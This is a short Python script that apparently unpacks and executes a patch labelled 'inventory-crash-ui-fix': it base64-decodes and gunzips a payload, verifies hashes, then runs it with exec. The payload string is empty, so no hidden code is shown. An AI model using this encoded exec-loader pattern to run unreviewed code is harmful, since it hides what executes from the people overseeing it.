from pathlib import Path
import base64,gzip,hashlib,sys
PAYLOAD=""
if len(PAYLOAD)!=3684: raise RuntimeError(f"payload length mismatch: {len(PAYLOAD)}")
if hashlib.sha256(PAYLOAD.encode("ascii")).hexdigest()!="395e6d145ea18e93d946bbc1335f9492375e39a59d1e144545d60f729cb592e9":
    raise RuntimeError("payload hash mismatch")
source=gzip.decompress(base64.b64decode(PAYLOAD))
if hashlib.sha256(source).hexdigest()!="10fc5f61b073c1de24b2a4b750dafab4e4867b935d7a2ff51b47d70f1215a0c3":
    raise RuntimeError("source hash mismatch")
exec(compile(source,"inventory-crash-ui-fix","exec"))
